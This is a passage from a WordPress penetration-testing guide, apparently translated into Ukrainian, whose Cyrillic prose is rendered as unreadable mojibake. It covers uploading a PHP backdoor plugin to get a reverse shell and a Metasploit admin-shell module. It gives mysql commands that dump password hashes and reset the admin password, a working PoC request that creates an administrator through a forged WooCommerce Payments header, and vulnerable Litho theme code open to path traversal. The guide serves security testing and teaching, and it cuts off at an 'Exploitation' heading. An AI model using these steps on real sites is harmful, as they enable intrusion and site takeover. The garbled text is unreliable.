–ü–æ—à—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
—â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Å—ñ—é.

## Plugin RCE

### PHP plugin

–ú–æ–∂–ª–∏–≤–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª–∏ .php —è–∫ –ø–ª–∞–≥—ñ–Ω.\
–°—Ç–≤–æ—Ä—ñ—Ç—å —Å–≤—ñ–π PHP backdoor, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../images/image (183).png>)

–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π –ø–ª–∞–≥—ñ–Ω:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

–ô–º–æ–≤—ñ—Ä–Ω–æ, —Ü–µ, –∑–¥–∞—î—Ç—å—Å—è, –Ω—ñ—á–æ–≥–æ –Ω–µ –∑—Ä–æ–±–∏—Ç—å, –∞–ª–µ —è–∫—â–æ –ø–µ—Ä–µ–π—Ç–∏ –≤ Media, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –≤–∞—à shell –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–º:

![](<../../images/image (462).png>)

–í—ñ–¥–∫—Ä–∏–π—Ç–µ –π–æ–≥–æ, —ñ –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ URL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è reverse shell:

![](<../../images/image (1006).png>)

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞

–¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –≤—ñ–¥–æ–º–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞, —è–∫–∏–π –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è web shell. –ü—Ä–æ—Ü–µ—Å –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ WordPress dashboard –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

1. **–û—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**: –ü–ª–∞–≥—ñ–Ω –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑ –¥–∂–µ—Ä–µ–ª–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ Exploit DB —è–∫ [**here**](https://www.exploit-db.com/exploits/36374).
2. **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω–∞**:
- –ü–µ—Ä–µ–π–¥—ñ—Ç—å —É WordPress dashboard, –ø–æ—Ç—ñ–º –≤ `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **–ê–∫—Ç–∏–≤–∞—Ü—ñ—è –ø–ª–∞–≥—ñ–Ω–∞**: –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ–≥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–ª–∞–≥—ñ–Ω –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ dashboard.
4. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**:
- –Ø–∫—â–æ —ñ–Ω—Å—Ç–∞–ª—é–≤–∞—Ç–∏ —ñ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω "reflex-gallery", –π–æ–≥–æ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤—ñ–¥–æ–º–∏–π —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π.
- Metasploit framework –Ω–∞–¥–∞—î –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –º–æ–¥—É–ª—å —ñ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –ø–µ–≤–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ meterpreter session, —â–æ –Ω–∞–¥–∞—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–∞–π—Ç—É.
- –ó–∞—É–≤–∞–∂—Ç–µ, —â–æ —Ü–µ –ª–∏—à–µ –æ–¥–∏–Ω –∑ –±–∞–≥–∞—Ç—å–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó WordPress —Å–∞–π—Ç—É.

–ö–æ–Ω—Ç–µ–Ω—Ç –º—ñ—Å—Ç–∏—Ç—å —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –ø–æ–∫–∞–∑—É—é—Ç—å –∫—Ä–æ–∫–∏ –≤ WordPress dashboard –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —Ç–∞ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ –ª–∏—à–µ –≤ –ø—Ä–∞–≤–æ–≤–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –ø—ñ–¥ —á–∞—Å penetration testing –∑ —è–≤–Ω–æ—é –∑–≥–æ–¥–æ—é.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). –í—ñ–Ω **–ø—ñ–¥—Ç—Ä–∏–º—É—î –≤–µ—Ä—Å—ñ—ó WordPress 6.X.X, 5.X.X —Ç–∞ 4.X.X —ñ –¥–æ–∑–≤–æ–ª—è—î:**
- _**Privilege Escalation:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —É WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Å–≤—ñ–π custom plugin (backdoor) —É WordPress.
- _**(RCE) Built-In Plugin Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —É WordPress.
- _**(RCE) Built-In Theme Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ç–µ–º–∏ —É WordPress.
- _**(Custom) Custom Exploits:**_ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º WordPress.

## Post Exploitation

–í–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### –ü–æ–≤–µ—Ä—Ö–Ω—è –∞—Ç–∞–∫–∏

–†–æ–∑—É–º—ñ–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ Wordpress –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è –ø–æ—à—É–∫—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É –π–æ–≥–æ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –µ–∫—Å–ø–æ–Ω—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —É –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—É–Ω–∫—Ç–∞—Ö, –∞ —Ç–∞–∫–æ–∂ –ø–æ–±–∞—á–∏—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ —É [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –Ω–∞–¥–∞–≤–∞—Ç–∏ —Å–≤–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, ‚Äî —á–µ—Ä–µ–∑ AJAX handlers. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–º–∏–ª–∫–∏ –≤ –ª–æ–≥—ñ—Ü—ñ, authorization –∞–±–æ authentication. –ë—ñ–ª—å—à —Ç–æ–≥–æ, –¥–æ—Å–∏—Ç—å —á–∞—Å—Ç–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±–∞–∑—É—é—Ç—å —ñ authentication, —ñ authorization –Ω–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ wordpress nonce, —è–∫–∏–π **–±—É–¥—å-—è–∫–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó Wordpress –º–æ–∂–µ –º–∞—Ç–∏** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –π–æ–≥–æ —Ä–æ–ª—ñ).

–ù–∏–∂—á–µ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤–∞–Ω–æ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –µ–∫—Å–ø–æ–Ω—É–≤–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ –ø–ª–∞–≥—ñ–Ω–∞:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å endpoint –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —É–≤—ñ–π—à–æ–≤ —É —Å–∏—Å—Ç–µ–º—É, –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

- **REST API**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑—Ä–æ–±–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ wordpress, –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—à–∏ REST API –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ‚Äî —Ü–µ callback-—Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –º–∞—î –ø–µ–≤–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø—Ä–∞–≤–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –º–µ—Ç–æ–¥ API.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **–ü—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ php-—Ñ–∞–π–ª—É**

–ó–≤—ñ—Å–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –Ω–∞–ø—Ä—è–º—É –¥–æ—Å—Ç—É–ø–Ω—ñ –∑ –≤–µ–±—É. –¢–æ–º—É, —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î –±—É–¥—å-—è–∫—É –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ —Ñ–∞–π–ª—É, —ó—ó –º–æ–∂—É—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å ¬´trusted header¬ª shortcuts –¥–ª—è internal integrations –∞–±–æ reverse proxies —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è REST-–∑–∞–ø–∏—Ç—ñ–≤. –Ø–∫—â–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–µ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ –ø–æ–≤'—è–∑–∞–Ω–∏–π —ñ–∑ –∑–∞–ø–∏—Ç–æ–º –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ upstream component, –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ —ñ –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—å –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä.

- Impact: –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–µ privilege escalation –¥–æ admin —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ core users REST route.
- –ü—Ä–∏–∫–ª–∞–¥ –∑–∞–≥–æ–ª–æ–≤–∫–∞: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä—à–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î

- –ü–ª–∞–≥—ñ–Ω –∑—ñ—Å—Ç–∞–≤–ª—è—î –∫–ª—ñ—î–Ω—Ç-–∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π header –∑—ñ —Å—Ç–∞–Ω–æ–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –ø—Ä–æ–ø—É—Å–∫–∞—î capability checks.
- WordPress core –æ—á—ñ–∫—É—î `create_users` capability –¥–ª—è —Ü—å–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç—É; –ø–ª–∞–≥—ñ–Ω –æ–±—Ö–æ–¥–∏—Ç—å —Ü–µ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ header.

–û—á—ñ–∫—É–≤–∞–Ω—ñ –æ–∑–Ω–∞–∫–∏ —É—Å–ø—ñ—Ö—É

- HTTP 201 –∑ JSON-—Ç—ñ–ª–æ–º, —â–æ –æ–ø–∏—Å—É—î —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –ù–æ–≤–∏–π admin-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –≤–∏–¥–∏–º–∏–π —É `wp-admin/users.php`.

–ü–µ—Ä–µ–ª—ñ–∫ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –í–∏–∫–æ–Ω–∞–π—Ç–µ grep –¥–ª—è `getallheaders()`, `$_SERVER['HTTP_...']` –∞–±–æ vendor SDKs, —è–∫—ñ —á–∏—Ç–∞—é—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó REST –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö callback-—ñ–≤, —â–æ –Ω–µ –º–∞—é—Ç—å –Ω–∞–¥—ñ–π–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `permission_callback` —ñ –Ω–∞—Ç–æ–º—ñ—Å—Ç—å –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø–∏—Ç—É.
- –®—É–∫–∞–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è core-—Ñ—É–Ω–∫—Ü—ñ–π —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ (`wp_insert_user`, `wp_create_user`) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ REST-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤, —è–∫—ñ –∑–∞—Ö–∏—â–µ–Ω—ñ –ª–∏—à–µ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ header.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. **capability check** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `current_user_can()` –∞–±–æ —Ö–æ—á–∞ –± `is_user_logged_in()`), —Ç–∞
2. **CSRF nonce**, –≤–∞–ª—ñ–¥–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `check_ajax_referer()` / `wp_verify_nonce()`, —Ç–∞
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–Ω–µ—Å–µ–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

* **–ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** ‚Äì –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ —Ö—É–∫ `wp_ajax_nopriv_`.
* **–í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce / capability** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ endpoint.
* **–í—ñ–¥—Å—É—Ç–Ω—è —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—è —à–ª—è—Ö—É** ‚Äì —Ä—è–¥–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º `fontfamily`, –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –∑ —Ñ–∞–π–ª–æ–≤–∏–º —à–ª—è—Ö–æ–º –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–ª–∞—Å–∏—á–Ω–∏–π `../../` traversal.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

